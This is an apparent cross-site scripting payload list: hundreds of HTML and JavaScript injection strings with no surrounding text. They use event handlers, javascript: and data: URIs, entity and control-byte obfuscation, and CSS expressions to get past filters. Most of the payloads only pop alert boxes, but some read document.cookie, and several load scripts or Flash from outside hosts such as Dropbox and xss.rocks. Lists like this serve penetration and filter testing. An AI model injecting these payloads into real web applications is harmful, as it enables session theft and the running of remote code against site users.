<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<INPUT TYPE="BUTTON" action="alert('XSS')"/>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
<IFRAME width="420" height="315" frameborder="0" onload="alert(document.cookie)"></IFRAME>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
<iframe src=http://xss.rocks/scriptlet.html <
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<img/src=`` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=``&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /**/>/**/alert(1)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe// src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
